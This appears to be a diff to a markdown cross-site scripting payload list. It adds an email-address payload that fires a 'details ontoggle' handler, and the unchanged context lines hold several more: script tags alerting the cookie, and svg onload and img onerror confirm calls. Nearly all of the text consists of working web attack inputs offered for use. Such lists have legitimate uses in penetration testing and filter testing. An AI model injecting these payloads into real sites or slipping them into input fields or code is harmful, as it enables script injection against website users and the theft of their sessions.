@@ -62,6 +62,7 @@ OnMoUsEoVeR=prompt(/hacked/)//
 "><script>alert(document.cookie)</script>
 /><svg src=x onload=confirm("1337");>
 &quot;&gt;&lt;img src=x onerror=confirm(document.domain);&gt;
+"mitsec<form/><!><details/open/ontoggle=alert(document.domain)>"@gmail.com
 ```
 ## XSS via Reflected Headers
 ```http
